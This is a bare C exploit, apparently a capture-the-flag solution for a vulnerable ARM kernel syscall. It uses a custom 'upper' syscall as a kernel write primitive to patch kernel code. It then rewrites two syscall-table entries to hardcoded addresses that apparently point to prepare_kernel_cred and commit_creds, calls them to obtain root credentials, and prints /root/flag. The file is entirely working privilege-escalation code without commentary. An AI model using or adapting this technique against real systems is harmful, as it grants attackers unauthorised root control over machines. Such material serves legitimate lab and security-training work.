#include <stdio.h>

#define SYS_CALL_TABLE		0x8000e348	
#define SYS_UPPER			223

int main(void){
	FILE* fp;
	char flag[128];
	unsigned int** sys_call_table = 0x8000e348;

	syscall(SYS_UPPER, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", 0x8003f560);
	syscall(SYS_UPPER, "\x6c\xf5\x03\x8c", &sys_call_table[25]);
	syscall(SYS_UPPER, "\x24\xf9\x03\x80", &sys_call_table[13]);

	syscall(25, syscall(13,0));

	fp = fopen("/root/flag","r");
	fgets(flag, 128, fp);
	printf("%s", flag);
	fclose(fp);

	return 0;
}
